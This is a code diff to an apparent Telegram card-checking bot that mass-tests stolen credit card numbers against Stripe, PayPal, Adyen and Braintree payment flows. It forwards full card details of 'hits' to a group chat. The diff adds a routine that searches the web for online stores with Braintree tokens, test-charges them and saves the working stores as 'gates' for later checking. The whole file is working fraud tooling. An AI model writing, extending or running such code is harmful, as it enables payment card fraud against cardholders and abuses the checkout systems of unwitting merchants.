                 emoji = _stage_emoji(step)
-                slot_status[slot_idx] = f"{emoji} `...{card_short}` \u279c `{site_short}` \u2014 {step}{retry_tag}"
+                slot_status[slot_idx] = f"{emoji} `...{card_short}` \u2014 {step}{retry_tag}"
                 await _update_status_msg()
 
             should_retry = False
@@ -6674,7 +7155,6 @@ async def mst_cmd(event):
     asyncio.create_task(process_mst_cards(event, cards, user_id))
 
 async def process_mst_cards(event, cards, user_id):
-    from gates.stripe_api import stripe_api_check
     total = len(cards)
     await register_mass_user(user_id)
     concurrency = await get_dynamic_concurrency(5)
@@ -6691,10 +7171,10 @@ async def process_mst_cards(event, cards, user_id):
     stop_buttons = [[Button.inline("\U0001f6d1 Stop Check", stop_key)]]
 
     progress_msg = await event.reply(
-        f"\u26a1 **Mass Stripe Check**\n"
+        f"⚡ **Mass Stripe Check**\n"
         f"Cards: **{total}** | Workers: **{concurrency}**\n\n"
         f"Checking **0/{total}**...\n"
-        f"\u2705 Approved: 0 | \u274c Declined: 0 | \u26a0 Errors: 0",
+        f"✅ Approved: 0 | ❌ Declined: 0 | ⚠ Errors: 0",
         buttons=stop_buttons,
     )
 
@@ -6702,7 +7182,14 @@ async def process_mst_cards(event, cards, user_id):
     for cc, mm, yy, cvv in cards:
         if len(yy) == 4: yy = yy[2:]
         mm = mm.zfill(2)
+        # a number that fails Luhn cannot exist, so it never leaves the bot
+        if not checkLuhn(cc):
+            async with results_lock:
+                checked_count += 1
+                declined_count += 1
+            continue
         await card_queue.put((cc, mm, yy, cvv))
+
 
     async def update_progress():
         now = time.time()
@@ -6735,16 +7222,25 @@ async def process_mst_cards(event, cards, user_id):
             resp = None
             try:
                 async with GLOBAL_MASS_SEM:
-                    resp = await asyncio.wait_for(stripe_api_check(cc, mm, yy, cvv), timeout=40)
-            except:
-                resp = "Error - Timeout"
+                    # the same $0 setup-intent gate as /st -- the old
+                    # third-party Stripe API is gone, it could not tell a
+                    # live card from a dead one
+                    resp = await asyncio.wait_for(
+                        run_gateway("st", cc, mm, yy, cvv, user_id=user_id,
+                                    is_admin=user_id in ADMIN_ID),
+                        timeout=75)
+            except asyncio.TimeoutError:
+                resp = "Error - Gateway Timeout"
+            except Exception as ex:
+                resp = f"Error - {type(ex).__name__}: {str(ex)[:80]}"
 
             resp_lower = resp.lower() if resp else ""
+            status = classify_response(resp)
             async with results_lock:
                 checked_count += 1
-                if "approved" in resp_lower or "success" in resp_lower:
+                if status in ("APPROVED", "CHARGED"):
                     approved_list.append(f"{cc}|{mm}|{yy}|{cvv}")
-                elif "error" in resp_lower:
+                elif status == "ERROR":
                     error_count += 1
                 else:
                     declined_count += 1
@@ -6769,7 +7265,7 @@ async def process_mst_cards(event, cards, user_id):
         try:
             await progress_msg.edit(final, buttons=None)
         except:
-            await event.reply(final)
+            await _send_long(event, final)
     except Exception as e:
         await event.reply(f"Mass Stripe Error: {e}")
     finally:
@@ -6915,7 +7411,7 @@ async def process_mpp_cards(event, cards, user_id):
         try:
             await progress_msg.edit(final, buttons=None)
         except:
-            await event.reply(final)
+            await _send_long(event, final)
     except Exception as e:
         await event.reply(f"Mass PayPal Error: {e}")
     finally:
@@ -7059,7 +7555,7 @@ async def process_msktxt_cards(event, cards, user_id):
         try:
             await progress_msg.edit(final, buttons=None)
         except:
-            await event.reply(final)
+            await _send_long(event, final)
     except Exception as e:
         await event.reply(f"Mass SK Error: {e}")
     finally:
@@ -7267,7 +7763,7 @@ async def _process_co_cards(event, cards, checkout_url, user_id, proxy=None):
                 try:
                     site_name = (session_cache or {}).get("merchant", "Stripe Checkout")
                     co_hit_msg = f"**Checkout Hit**\n`{cc}|{mm}|{yy}|{cvv}`\n{msg} | {card_info or ''}\nSite: {site_name}"
-                    await event.client.send_message(HIT_FORWARD_GROUP, co_hit_msg)
+                    await _send_hit_message(event.client, co_hit_msg)
                 except:
                     pass
                 try:
@@ -7598,7 +8094,7 @@ async def _process_hit(event, charged_ccs, checkout_url, user_id, requested_coun
                 try:
                     site_name = (session_cache or {}).get("merchant", "Stripe Checkout")
                     auto_hit_msg = f"\U0001f525 **Auto Hit Charged!**\n`{cc}|{mm}|{yy}|{cvv}`\n{msg}\nSite: {site_name}"
-                    await event.client.send_message(HIT_FORWARD_GROUP, auto_hit_msg)
+                    await _send_hit_message(event.client, auto_hit_msg)
                 except:
                     pass
                 try:
@@ -7721,7 +8217,7 @@ async def _process_hit(event, charged_ccs, checkout_url, user_id, requested_coun
         try:
             await progress_msg.edit(final_text, buttons=None)
         except:
-            await event.reply(final_text)
+            await _send_long(event, final_text)
 
     except Exception as e:
         await event.reply(f"Hit Error: {e}")
@@ -7869,7 +8365,115 @@ async def url_cmd(event):
         result = format_result(data, username)
         await msg.edit(result)
     except Exception as e:
-        await msg.edit(f"**Analysis Failed**\n\nError: {str(e)[:100]}")
+        await msg.edit(f"**Analysis Failed**\n\nError: {type(e).__name__}: {str(e)[:100]}")
+
+
+async def _verify_braintree_stores(found):
+    """Which of the found stores can the Braintree gates really use?
+
+    A store that mentions Braintree is not enough: the gate has to be
+    able to take the token from the page and get an answer from the
+    bank.  The stores that pass are added to the list the /b3 and /b3c
+    gates use, so they are in use on the very next card.
+    """
+    import json as _json
+    import re as _re
+    try:
+        import httpx
+        import gates.b3_charge as B3C
+        from gates.braintree_idt import UA as BT_UA
+    except Exception as e:
+        return f"\n\n**Braintree check:** the gate could not be loaded ({e})"
+
+    # the token can sit in a named field or in a script config
+    drupal = _re.compile(r"['\"](production_[a-z0-9_]{16,})['\"]")
+    woo = _re.compile(r'"client_token_nonce"\s*:\s*"([a-f0-9]{8,12})"')
+    card = ("4111111111111111", "12", "2030", "123")
+    lines = []
+    working = []
+    sem = asyncio.Semaphore(8)
+
+    async def check_one(url):
+        """Does this store work, and what does the gate say?"""
+        async with sem:
+            try:
+                async with httpx.AsyncClient(timeout=httpx.Timeout(20),
+                                             follow_redirects=True,
+                                             headers={"user-agent": BT_UA}) as c:
+                    r = await c.get(url)
+                    html = r.text
+            except Exception:
+                return None
+            if drupal.search(html):
+                kind = "drupal"
+            elif woo.search(html):
+                kind = "woocommerce"
+            else:
+                return None
+            site = {"url": url, "token_pattern": None, "type": kind}
+            if kind == "drupal":
+                site["token_pattern"] = drupal.pattern
+            saved = B3C.BRAINTREE_SITES
+            B3C.BRAINTREE_SITES = [site]
+            try:
+                # a slow store must not hold up the whole command
+                res = await asyncio.wait_for(
+                    B3C.b3_charge_check(*card), timeout=40)
+            except asyncio.TimeoutError:
+                res = "error the store was too slow"
+            except Exception as e:
+                res = f"error {type(e).__name__}"
+            finally:
+                B3C.BRAINTREE_SITES = saved
+            # a real answer from the bank, not a form error
+            ok = ("Declined -" in res or "Approved -" in res) and \
+                "Processing Error" not in res
+            return url, kind, res, ok, site
+
+    urls = []
+    for item in (found or []):
+        url = (item.get("url") or "").strip() if isinstance(item, dict) else str(item)
+        if url and url.startswith("http") and url not in urls:
+            urls.append(url)
+
+    try:
+        for out in await asyncio.gather(*[check_one(u) for u in urls],
+                                        return_exceptions=True):
+            if not isinstance(out, tuple):
+                continue
+            url, kind, res, ok, site = out
+            lines.append(f"  {'WORKS' if ok else 'no   '} {url}\n         {res[:100]}")
+            if ok:
+                working.append(site)
+    except Exception as e:
+        return f"\n\n**Braintree check:** {type(e).__name__}: {str(e)[:80]}"
+    except Exception as e:
+        return f"\n\n**Braintree check:** {type(e).__name__}: {str(e)[:80]}"
+
+    # the stores that work are saved for the gates
+    if working:
+        try:
+            path = "/root/hitchecker/braintree_sites.json"
+            old = []
+            try:
+                with open(path) as f:
+                    old = _json.load(f)
+            except Exception:
+                old = []
+            for s in working:
+                if s not in old:
+                    old.append(s)
+            with open(path, "w") as f:
+                _json.dump(old, f, indent=1)
+        except Exception:
+            pass
+
+    out = "\n\n**Braintree check (the real /b3c gate was run):**\n"
+    out += "\n".join(lines) if lines else "  no store with a Braintree token"
+    if working:
+        out += (f"\n\n**{len(working)} store(s) work and are now used by "
+                f"/b3 and /b3c.**")
+    return out
 
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/]findsite\b'))
@@ -7904,11 +8508,19 @@ async def findsite_cmd(event):
     args = parts[1].strip().split()
     gateway = args[0].lower()
     max_results = 10
-    if len(args) > 1:
-        try:
-            max_results = min(max(int(args[1]), 1), 25)
-        except ValueError:
-            pass
+    deep = True
+    for a in args[1:]:
+        if a.lower() in ("fast", "quick", "shallow"):
+            deep = False
+        elif a.lower() in ("deep", "wide"):
+            deep = True
+        else:
+            try:
+                max_results = min(max(int(a), 1), 150)
+            except ValueError:
+                pass
+    if not deep:
+        max_results = min(max_results, 25)
 
     if gateway not in SUPPORTED_GATEWAYS and gateway not in [g.lower() for g in SUPPORTED_GATEWAYS]:
         gw_list = ", ".join(sorted(SUPPORTED_GATEWAYS))
@@ -7919,8 +8531,10 @@ async def findsite_cmd(event):
 
     msg = await event.reply(
         f"\U0001f50d **Finding {gateway.title()} sites...**\n"
-        f"Searching web & verifying gateways...\n"
-        f"This may take a moment."
+        + (f"**Deep scan** - many dorks, many engines, deep verification.\n"
+           if deep else "**Quick scan**\n")
+        + "Searching web & verifying gateways...\n"
+        f"This may take a few minutes."
     )
 
     try:
@@ -7934,11 +8548,20 @@ async def findsite_cmd(event):
 
         user = await event.get_sender()
         username = user.username or ""
-        data = await find_sites(gateway, max_results=max_results, progress_callback=progress)
+        data = await find_sites(gateway, max_results=max_results,
+                                progress_callback=progress, deep=deep)
         result = format_finder_result(data, username)
+        if gateway.lower() == "braintree":
+            # a store that mentions Braintree is not enough: the gate
+            # has to be able to use it
+            try:
+                await progress("Checking the stores with the real Braintree gate...")
+                result += await _verify_braintree_stores(data.get("found") or [])
+            except Exception as e:
+                result += f"\n\n**Braintree check failed:** {type(e).__name__}: {str(e)[:80]}"
         await msg.edit(result)
     except Exception as e:
-        await msg.edit(f"**Site Finder Failed**\n\nError: {str(e)[:100]}")
+        await msg.edit(f"**Site Finder Failed**\n\nError: {type(e).__name__}: {str(e)[:100]}")
 
 
 @client.on(events.NewMessage(pattern='/info'))
@@ -8642,7 +9265,7 @@ async def _process_aco_cards(event, cards, payment_url, user_id, proxy=None):
                 label = "CHARGED"
                 try:
                     co_hit_msg = f"**Adyen Checkout Hit**\n`{cc}|{mm}|{yy}|{cvv}`\n{msg}\nSite: Adyen Checkout"
-                    await event.client.send_message(HIT_FORWARD_GROUP, co_hit_msg)
+                    await _send_hit_message(event.client, co_hit_msg)
                 except:
                     pass
             elif status in ("live", "3ds"):
@@ -8737,7 +9360,7 @@ async def main():
         await main()
 
 if __name__ == "__main__":
-    if sys.platform.startswith('win'):
+    if sys.platform.startswith('win') and sys.version_info < (3, 14):
         asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
     try:
         asyncio.run(main())
